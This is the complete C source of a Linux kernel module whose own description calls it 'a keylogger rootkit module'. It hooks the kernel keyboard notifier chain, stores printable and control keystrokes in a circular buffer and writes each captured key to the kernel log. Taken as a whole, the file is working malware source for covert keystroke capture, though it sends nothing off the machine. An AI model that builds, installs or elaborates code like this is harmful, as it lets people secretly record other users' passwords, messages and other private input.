/* keylogger.c */

// for kernel module
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

// for memset
#include <linux/string.h>

// for keyboard and notification chain
#include <linux/notifier.h>
#include <linux/keyboard.h>

#define DEBUG 0
#define debug(args...) if(DEBUG) printk(KERN_INFO args)

#define BUF_SIZE 256

static char key_buf[BUF_SIZE];
static unsigned int key_buf_len;

/* we only record ASCII characters and backspace, enter, tab, esc
 * return 1 if record the c */
int record_key(char c) {
    // ASCII
    if(c >= 0x20 && c < 0x7f) {
        key_buf[key_buf_len] = c;
        return 1;
    }
    // return 
    else if(c == 0x01) {
        key_buf[key_buf_len] = '\n';
        return 1;
    }
    // del
    else if(c == 0x7f) {
        key_buf[key_buf_len] = '\b';
        return 1;
    }
    // tab
    else if(c == 0x09) {
        key_buf[key_buf_len] = '\t';
        return 1;
    }
    // esc
    else if(c == 0x1b) {
        key_buf[key_buf_len] = '\e';
        return 1;
    }
    // do nothing
    else {
        return 0;
    }
}

/* print the latest recorded character*/
void print_key(void) {
    char c = key_buf[key_buf_len];
    // ASCII
    if(c >= 0x20 && c < 0x7f)
        printk(KERN_INFO "%c(0x%x)\n", c, c);
    // Non ASCII
    else
        printk(KERN_INFO ".(0x%x)\n", c);
}


/* notifier callback function */
int keylogger_cb(struct notifier_block *nb, unsigned long action, void *data) {
    
    struct keyboard_notifier_param *param = data;

    if(action == KBD_KEYSYM && param->down) {
        
        debug("cb: down:%d; shift:%d; value:%x; ledstate:%d; action:%lx\n",
        param->down,
        param->shift,
        param->value,
        param->ledstate,
        action);

        if(record_key((char)param->value)) {
            print_key();
            key_buf_len++;
        }

        // loop back
        if(key_buf_len >= BUF_SIZE) {
            key_buf_len = 0;
        }

    }

    return NOTIFY_OK;
}

/* notifier block in the notification chain*/
static struct notifier_block nb = {
    .notifier_call = keylogger_cb,
};

/* init function */
static int keylogger_init(void)
{
    printk(KERN_INFO "Keylogger is loaded!\n");
    memset(key_buf, 0, BUF_SIZE);
    key_buf_len = 0;
    register_keyboard_notifier(&nb);
    return 0;
}

/* exit function */
static void keylogger_exit(void)
{
    unregister_keyboard_notifier(&nb);
    printk(KERN_INFO "Keylogger is unloaded!\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE ("GPL");
MODULE_AUTHOR ("Richard Wu");
MODULE_DESCRIPTION ("a keylogger rootkit module");
MODULE_VERSION("1.0");
